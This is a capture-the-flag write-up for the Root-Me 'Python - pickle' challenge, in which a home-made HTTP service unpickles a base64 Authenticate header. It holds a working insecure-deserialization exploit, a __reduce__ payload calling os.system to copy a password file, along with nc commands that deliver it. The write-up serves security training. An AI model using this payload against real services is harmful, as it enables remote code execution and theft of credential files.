## Python - pickle

| Author | Level | Points |
| ------ | ----- | ------ |
| koma | Medium | 25 |


> Home-Made HTTP service
>
> **Statement**
>
> Authenticate as admin and capture the flag from .passwd file.

#### Solution

First, test the TCP connection with `curl`

```
curl -v challenge02.root-me.org
```

```
{"result": "Not allowed you should first AUTH"}
```

Change `AUTH` of header

```
echo -e 'AUTH admin HTTP/1.1\r\n' | nc challenge02.root-me.org 60005
```

```
{"result": "Can't find 'Authenticate' header"}
```

Now, add `Authenticate` header to it

```
echo -e 'AUTH admin HTTP/1.1\r\nAuthenticate: admin' | nc challenge02.root-me.org 60005
```

```
{"result": "Authentication failed = Traceback (most recent call last):\n  File \"/challenge/app-script/ch5/ch5\", line 52, in do_AUTH\n    authcombi = pickle.loads(base64.b64decode(self.headers.getheader('Authenticate')))\n  File \"/usr/lib/python2.7/base64.py\", line 76, in b64decode\n    raise TypeError(msg)\nTypeError: Incorrect padding\n"}
```

We know webserver is base64 decoding the authentication header and write a Python code

```python
import os
import cPickle
import base64

class Exploit(object):
	def __reduce__(self):
		return (os.system, ('cat /challenge/app-script/ch5/.passwd > /tmp/pickle; chmod 777 /tmp/pickle',))

print base64.b64encode(cPickle.dumps(Exploit()))
```

Then add the result after run Python to variable `A` and run

```sh
#!/bin/sh
A="<result_of_Python_code>"
echo -e "AUTH admin HTTP/1.1\r\nAuthenticate: $A\r\n" | nc challenge02.root-me.org 60005
```

After that, login to another user from another `app-script` challenge and get the flag

```
cat /tmp/pickle
```